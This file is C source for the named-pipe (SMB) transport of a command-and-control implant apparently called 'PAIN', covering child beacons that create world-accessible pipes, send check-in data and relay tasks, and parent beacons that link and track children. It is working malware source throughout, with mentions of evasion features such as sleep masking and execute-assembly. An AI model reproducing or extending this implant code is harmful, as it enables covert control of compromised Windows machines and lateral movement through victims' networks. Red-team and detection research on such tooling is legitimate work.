#include <windows.h>
#include <aclapi.h>
#include <Native.h>
#include <Agent.h>
#include <Defines.h>
#include <Internals.h>

#if PAIN_PROFILE_C2 == PROFILE_SMB

DECLFN BOOL Smb_Send( PVOID data, UINT32 data_len, PVOID* out_buf, UINT32* out_len )
{
    G_AGENT;

    Self->Ntdll.DbgPrint( "[SMB] Smb_Send: handle=%p TasksRead=%d data_len=%d\n",
        Self->Config.PipeHandle, Self->Config.TasksRead, data_len );

    // PHASE 1: Create pipe + wait for parent to connect (no handle yet)
    if ( !Self->Config.PipeHandle ) {

        // Build a world-readable security descriptor so a parent running under
        // a different session / integrity level can open the pipe.
        SECURITY_ATTRIBUTES  sa   = {};
        SECURITY_DESCRIPTOR  sd   = {};
        SID_IDENTIFIER_AUTHORITY world_auth = SECURITY_WORLD_SID_AUTHORITY;
        EXPLICIT_ACCESSA     ace  = {};
        SID*  world_sid = nullptr;
        ACL*  dacl      = nullptr;

        Self->Advapi32.AllocateAndInitializeSid(
            &world_auth, 1, SECURITY_WORLD_RID,
            0, 0, 0, 0, 0, 0, 0, (PSID*)&world_sid );

        ace.grfAccessPermissions = SPECIFIC_RIGHTS_ALL | STANDARD_RIGHTS_ALL;
        ace.grfAccessMode        = SET_ACCESS;
        ace.grfInheritance       = NO_INHERITANCE;
        ace.Trustee.TrusteeType  = TRUSTEE_IS_WELL_KNOWN_GROUP;
        ace.Trustee.TrusteeForm  = TRUSTEE_IS_SID;
        ace.Trustee.ptstrName    = (LPSTR)world_sid;

        Self->Advapi32.SetEntriesInAclA( 1, &ace, nullptr, &dacl );
        Self->Advapi32.InitializeSecurityDescriptor( &sd, SECURITY_DESCRIPTOR_REVISION );
        Self->Advapi32.SetSecurityDescriptorDacl( &sd, TRUE, dacl, FALSE );

        sa.nLength              = sizeof( sa );
        sa.bInheritHandle       = FALSE;
        sa.lpSecurityDescriptor = &sd;

        Self->Config.PipeHandle = Self->Krnl32.CreateNamedPipeA(
            Self->Config.PipeName,
            PIPE_ACCESS_DUPLEX,
            PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
            PIPE_UNLIMITED_INSTANCES,
            PIPE_BUFFER_LENGTH,
            PIPE_BUFFER_LENGTH,
            0,
            &sa
        );

        if ( Self->Config.PipeHandle == INVALID_HANDLE_VALUE ||
             !Self->Config.PipeHandle ) {
            Self->Ntdll.DbgPrint( "[SMB] CreateNamedPipeA failed\n" );
            Self->Config.PipeHandle = nullptr;
            return FALSE;
        }

        Self->Ntdll.DbgPrint( "[SMB] Pipe created: %s handle=%p\n",
            Self->Config.PipeName, Self->Config.PipeHandle );

        // Protect the pipe handle for its entire lifetime.
        // execute-assembly's ICorRuntimeHost::UnloadDomain() spawns async CLR thread-pool
        // threads (TppWorkerThread) that finalize managed SafeHandles. These finalizers call
        // CloseHandle on whatever numeric handle value they wrapped. If that value matches
        // our pipe slot (handle recycling), PeekNamedPipe fails. PROTECT_FROM_CLOSE makes
        // the kernel reject any CloseHandle/NtClose on this handle until we explicitly clear
        // the flag in smb_error. This covers CLR threads that spawn well after Bof_Loader
        // returns, since UnloadDomain schedules cleanup work on the Windows thread pool with
        // an arbitrary delay.
        {
            BOOL phi_ok = Self->Krnl32.SetHandleInformation( Self->Config.PipeHandle,
                HANDLE_FLAG_PROTECT_FROM_CLOSE, HANDLE_FLAG_PROTECT_FROM_CLOSE );
            Self->Ntdll.DbgPrint( "[SMB] PROTECT_FROM_CLOSE set: handle=%p ok=%d\n",
                Self->Config.PipeHandle, phi_ok );
        }

        // Block until the parent beacon runs the link command
        Self->Ntdll.DbgPrint( "[SMB] Waiting for parent to connect...\n" );

        if ( !Self->Krnl32.ConnectNamedPipe( Self->Config.PipeHandle, nullptr ) ) {
            DWORD err = 0;
            // GetLastError is not available in PIC; read from TEB LastErrorValue
            if ( err != ERROR_PIPE_CONNECTED ) {
                Self->Ntdll.DbgPrint( "[SMB] ConnectNamedPipe failed\n" );
                goto smb_error;
            }
        }

        Self->Ntdll.DbgPrint( "[SMB] Parent connected\n" );

        // First call: write checkin data and return - no response expected yet
        if ( !Self->Session.Connected ) {
            if ( data && data_len > 0 ) {
                UINT32 total_len = sizeof( UINT32 ) + data_len;
                PBYTE  combined  = (PBYTE)Heap_Alloc( total_len );
                if ( !combined ) goto smb_error;

                Mem_Copy( combined,                  &data_len, sizeof( UINT32 ) );
                Mem_Copy( combined + sizeof( UINT32 ), data,     data_len         );

                DWORD written = 0;
                if ( !Self->Krnl32.WriteFile( Self->Config.PipeHandle,
                                              combined, total_len, &written, nullptr ) ) {
                    Self->Ntdll.DbgPrint( "[SMB] Checkin WriteFile failed\n" );
                    Heap_Free( combined );
                    goto smb_error;
                }
                Heap_Free( combined );
                Self->Ntdll.DbgPrint( "[SMB] Checkin sent (%d bytes)\n", data_len );
            }

            // Pipe stays open; next Dispatcher cycle reads the first task batch
            Self->Config.TasksRead = FALSE;
            return TRUE;
        }
    }

    // PHASE 2: Persistent handle - alternating read/write via TasksRead flag

    // Call 2: write results to parent
    if ( Self->Config.TasksRead ) {
        Self->Ntdll.DbgPrint( "[SMB] Call 2: writing results\n" );

        if ( data && data_len > 0 ) {
            UINT32 total_len = sizeof( UINT32 ) + data_len;
            PBYTE  combined  = (PBYTE)Heap_Alloc( total_len );
            if ( !combined ) goto smb_error;

            Mem_Copy( combined,                  &data_len, sizeof( UINT32 ) );
            Mem_Copy( combined + sizeof( UINT32 ), data,     data_len         );

            DWORD written = 0;
            if ( !Self->Krnl32.WriteFile( Self->Config.PipeHandle,
                                          combined, total_len, &written, nullptr ) ) {
                Self->Ntdll.DbgPrint( "[SMB] Call 2: WriteFile failed\n" );
                Heap_Free( combined );
                goto smb_error;
            }
            Heap_Free( combined );
            Self->Ntdll.DbgPrint( "[SMB] Call 2: wrote %d bytes\n", data_len );
        }

        Self->Config.TasksRead = FALSE;
        return TRUE;
    }

    // Call 1: read tasks from parent
    {
        Self->Ntdll.DbgPrint( "[SMB] Call 1: reading tasks\n" );

        // Spin until parent writes the task batch (PeekNamedPipe returns FALSE
        // on a broken pipe so we can bail out without an infinite loop).
        // Plain Sleep(100) matches Kharon's exact design: the sleep mask (Timer Spoof /
        // Ekko) runs once per relay cycle in the main loop - not here. Using Beacon_Sleep
        // in this spin causes NtSetContextThread to fire while CLR thread pool threads
        // from execute-assembly are alive, which corrupts the timer chain and breaks the pipe.
        DWORD msg_len = 0;
        while ( TRUE ) {
            if ( !Self->Krnl32.PeekNamedPipe(
                    Self->Config.PipeHandle, nullptr, 0, nullptr, &msg_len, nullptr ) ) {
                DWORD _err = *(DWORD*)((PBYTE)NtCurrentTeb() + 0x68);
                Self->Ntdll.DbgPrint( "[SMB] Call 1: PeekNamedPipe FAILED err=%lu handle=%p\n",
                    _err, Self->Config.PipeHandle );
                goto smb_error;
            }
            if ( msg_len >= sizeof( UINT32 ) ) break;
            Self->Krnl32.Sleep( 100 );
        }

        PBYTE msg_buf = (PBYTE)Heap_Alloc( msg_len );
        if ( !msg_buf ) goto smb_error;

        DWORD read_len = 0;
        if ( !Self->Krnl32.ReadFile( Self->Config.PipeHandle,
                                     msg_buf, msg_len, &read_len, nullptr ) ) {
            Self->Ntdll.DbgPrint( "[SMB] Call 1: ReadFile failed\n" );
            Heap_Free( msg_buf );
            goto smb_error;
        }

        // Strip the 4-byte length prefix written by the parent
        UINT32 task_len = read_len - sizeof( UINT32 );
        PBYTE  task_buf = (PBYTE)Heap_Alloc( task_len );
        if ( !task_buf ) { Heap_Free( msg_buf ); goto smb_error; }
        Mem_Copy( task_buf, msg_buf + sizeof( UINT32 ), task_len );
        Heap_Free( msg_buf );

        // Return task_buf directly - PackTasks output is [4B count][tasks...]
        // which Task_Dispatch reads as-is; no UUID prefix skipping needed here.
        if ( out_buf ) *out_buf = task_buf;
        if ( out_len ) *out_len = task_len;

        Self->Ntdll.DbgPrint( "[SMB] Call 1: read %d bytes tasks\n", task_len );

        Self->Config.TasksRead = TRUE;
        return TRUE;
    }

smb_error:
    Self->Ntdll.DbgPrint( "[SMB] Pipe error - resetting\n" );
    if ( Self->Config.PipeHandle ) {
        // Clear PROTECT_FROM_CLOSE so NtClose can close the handle.
        Self->Krnl32.SetHandleInformation( Self->Config.PipeHandle,
            HANDLE_FLAG_PROTECT_FROM_CLOSE, 0 );
        Self->Krnl32.DisconnectNamedPipe( Self->Config.PipeHandle );
        Self->Ntdll.NtClose( Self->Config.PipeHandle );
    }
    Self->Config.PipeHandle = nullptr;
    Self->Config.TasksRead  = FALSE;
    return FALSE;
}

#endif // PAIN_PROFILE_C2 == PROFILE_SMB



// SMB PARENT RELAY ROLE
// Open a child's named pipe, read its checkin blob, register as a linked node.
// Returns the PAIN_SMB_DATA* node, or nullptr on failure.
DECLFN PVOID Smb_Add( PCHAR pipe_path )
{
    G_AGENT;

    Self->Ntdll.DbgPrint( "[SMB-Parent] Smb_Add: connecting to %s\n", pipe_path );

    // Open the child's already-created pipe
    HANDLE h = Self->Krnl32.CreateFileA(
        pipe_path,
        GENERIC_READ | GENERIC_WRITE,
        0,
        nullptr,
        OPEN_EXISTING,
        0,
        nullptr
    );

    if ( h == INVALID_HANDLE_VALUE || !h ) {
        Self->Ntdll.DbgPrint( "[SMB-Parent] Smb_Add: CreateFileA failed\n" );
        return nullptr;
    }

    // Wait for child to write its checkin blob (child writes after ConnectNamedPipe)
    DWORD avail   = 0;
    ULONG retries = 0;
    while ( retries < 50 ) {
        if ( Self->Krnl32.PeekNamedPipe( h, nullptr, 0, nullptr, &avail, nullptr ) ) {
            if ( avail >= sizeof( UINT32 ) ) break;
        }
        Self->Krnl32.Sleep( 100 );
        retries++;
    }

    if ( avail < sizeof( UINT32 ) ) {
        Self->Ntdll.DbgPrint( "[SMB-Parent] Smb_Add: no checkin data after retries\n" );
        Self->Ntdll.NtClose( h );
        return nullptr;
    }

    // Read the full message: [4B len][36B UUID][checkin payload]
    PBYTE msg_buf = (PBYTE)Heap_Alloc( avail );
    if ( !msg_buf ) { Self->Ntdll.NtClose( h ); return nullptr; }

    DWORD read_len = 0;
    if ( !Self->Krnl32.ReadFile( h, msg_buf, avail, &read_len, nullptr ) ) {
        Self->Ntdll.DbgPrint( "[SMB-Parent] Smb_Add: ReadFile failed\n" );
        Heap_Free( msg_buf );
        Self->Ntdll.NtClose( h );
        return nullptr;
    }

    if ( read_len <= sizeof( UINT32 ) ) {
        Self->Ntdll.DbgPrint( "[SMB-Parent] Smb_Add: message too small\n" );
        Heap_Free( msg_buf );
        Self->Ntdll.NtClose( h );
        return nullptr;
    }

    // Strip 4-byte length prefix → payload starts with [36 UUID][checkin data]
    UINT32 payload_len = read_len - sizeof( UINT32 );
    PBYTE  payload     = (PBYTE)Heap_Alloc( payload_len );
    if ( !payload ) {
        Heap_Free( msg_buf );
        Self->Ntdll.NtClose( h );
        return nullptr;
    }
    Mem_Copy( payload, msg_buf + sizeof( UINT32 ), payload_len );
    Heap_Free( msg_buf );

    // Extract UUID (first 36 bytes of payload)
    PCHAR uuid = (PCHAR)Heap_Alloc( 37 );
    if ( !uuid ) { Heap_Free( payload ); Self->Ntdll.NtClose( h ); return nullptr; }
    Mem_Copy( uuid, payload, 36 );
    uuid[36] = '\0';

    Self->Ntdll.DbgPrint( "[SMB-Parent] Smb_Add: child UUID=%s\n", uuid );

    // Store pipe path so the node is self-describing
    UINT32 path_len = 0;
    while ( pipe_path[path_len] ) path_len++;
    PCHAR path_copy = (PCHAR)Heap_Alloc( path_len + 1 );
    if ( !path_copy ) {
        Heap_Free( uuid ); Heap_Free( payload );
        Self->Ntdll.NtClose( h );
        return nullptr;
    }
    Mem_Copy( path_copy, pipe_path, path_len );
    path_copy[path_len] = '\0';

    // Allocate and fill the node
    PAIN_SMB_DATA* node = (PAIN_SMB_DATA*)Heap_Alloc( sizeof( PAIN_SMB_DATA ) );
    if ( !node ) {
        Heap_Free( uuid ); Heap_Free( payload ); Heap_Free( path_copy );
        Self->Ntdll.NtClose( h );
        return nullptr;
    }

    node->Handle     = h;
    node->AgentUUID  = uuid;
    node->PipePath   = path_copy;
    node->CheckinBuf = payload;
    node->CheckinLen = payload_len;
    node->Next       = nullptr;

    // Append to the linked list
    if ( !Self->Config.SmbNode ) {
        Self->Config.SmbNode = node;
    } else {
        PAIN_SMB_DATA* cur = (PAIN_SMB_DATA*)Self->Config.SmbNode;
        while ( cur->Next ) cur = cur->Next;
        cur->Next = node;
    }

    Self->Ntdll.DbgPrint( "[SMB-Parent] Smb_Add: registered child %s\n", uuid );
    return node;
}

// Remove and free a child node by pointer.
DECLFN BOOL Smb_Rm( PVOID node_ptr )
{
    G_AGENT;

    if ( !node_ptr || !Self->Config.SmbNode ) return FALSE;

    PAIN_SMB_DATA* target  = (PAIN_SMB_DATA*)node_ptr;
    PAIN_SMB_DATA* current = (PAIN_SMB_DATA*)Self->Config.SmbNode;
    PAIN_SMB_DATA* prev    = nullptr;

    while ( current ) {
        if ( current == target ) {
            if ( prev ) prev->Next = current->Next;
            else        Self->Config.SmbNode = current->Next;

            if ( current->Handle    ) Self->Ntdll.NtClose( current->Handle );
            if ( current->AgentUUID ) Heap_Free( current->AgentUUID );
            if ( current->PipePath  ) Heap_Free( current->PipePath  );
            if ( current->CheckinBuf) Heap_Free( current->CheckinBuf);
            Heap_Free( current );
            return TRUE;
        }
        prev    = current;
        current = current->Next;
    }
    return FALSE;
}

// Find a child node by its 36-char UUID string. Returns PAIN_SMB_DATA* or nullptr.
DECLFN PVOID Smb_Get( PCHAR uuid )
{
    G_AGENT;

    if ( !uuid || !Self->Config.SmbNode ) return nullptr;

    PAIN_SMB_DATA* cur = (PAIN_SMB_DATA*)Self->Config.SmbNode;
    while ( cur ) {
        if ( cur->AgentUUID ) {
            // compare first 36 bytes
            BOOL match = TRUE;
            for ( UINT32 i = 0; i < 36; i++ ) {
                if ( cur->AgentUUID[i] != uuid[i] ) { match = FALSE; break; }
            }
            if ( match ) return cur;
        }
        cur = cur->Next;
    }
    return nullptr;
}

// Return the head of the linked list (PAIN_SMB_DATA*).
DECLFN PVOID Smb_List()
{
    G_AGENT;
    return Self->Config.SmbNode;
}
